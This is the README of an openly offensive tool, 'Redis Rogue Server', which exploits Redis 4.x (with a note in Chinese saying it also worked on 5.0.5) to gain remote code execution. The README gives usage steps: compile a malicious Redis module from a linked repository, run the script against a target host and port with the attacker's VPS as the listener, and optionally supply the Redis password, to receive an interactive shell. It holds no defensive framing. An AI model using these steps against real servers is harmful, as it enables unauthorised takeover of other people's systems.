# Redis Rogue Server

A exploit for Redis 4.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

经测试Redis 5.0.5也可以使用，没有出现ppt上写的5.0无法set/get config的情况.

## Usage:

Compile .so from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

Copy the .so file to same folder with `redis-rogue-server.py`.

Run the rogue server:

```
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

如果目标Redis服务开启了认证功能，可以通过`--passwd`指定密码

The default target port is 6379 and the default vps port is 21000.

And you will get an interactive shell!